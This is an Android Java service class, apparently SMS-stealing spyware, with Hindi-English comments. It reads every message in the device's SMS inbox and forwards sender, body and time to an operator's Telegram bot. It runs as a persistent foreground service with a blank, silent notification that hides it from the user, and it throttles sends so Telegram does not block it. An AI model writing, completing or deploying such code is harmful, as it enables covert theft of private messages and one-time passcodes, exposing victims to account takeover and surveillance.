package com.smshandler;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Telephony;
import androidx.core.app.NotificationCompat;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsService extends Service {

    // ====== YAHAN APNA TOKEN AUR CHAT ID DAALO ======
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
    // ================================================

    private boolean oldSmsSent = false;

    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "sms_channel", "SMS Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            NotificationCompat.Builder notification = new NotificationCompat.Builder(this, "sms_channel")
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setSilent(true);

            startForeground(1, notification.build());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Purane SMS bhejo (sirf ek baar)
        if (!oldSmsSent) {
            oldSmsSent = true;
            new Thread(this::sendAllOldSms).start();
        }
        return START_STICKY;
    }

    private void sendAllOldSms() {
        try {
            ContentResolver cr = getContentResolver();
            Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
            
            Cursor cursor = cr.query(uri, null, null, null, "date ASC");
            
            if (cursor != null && cursor.moveToFirst()) {
                int senderIndex = cursor.getColumnIndex("address");
                int bodyIndex = cursor.getColumnIndex("body");
                int dateIndex = cursor.getColumnIndex("date");

                do {
                    String sender = senderIndex >= 0 ? cursor.getString(senderIndex) : "Unknown";
                    String body = bodyIndex >= 0 ? cursor.getString(bodyIndex) : "";
                    long date = dateIndex >= 0 ? cursor.getLong(dateIndex) : 0;

                    sendToTelegram(this, sender, body, date);
                    
                    // Thoda delay karo taki Telegram block na kare
                    Thread.sleep(800);
                    
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void sendToTelegram(Context context, String sender, String message, long timestamp) {
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
            
            // Message format
            String text = "📨 SMS Forwarded\n" +
                         "From: " + sender + "\n" +
                         "Msg: " + message + "\n" +
                         "Time: " + date;
            
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                           "/sendMessage?chat_id=" + CHAT_ID +
                           "&parse_mode=HTML" +
                           "&text=" + URLEncoder.encode(text, "UTF-8");

            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getInputStream();
            conn.disconnect();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
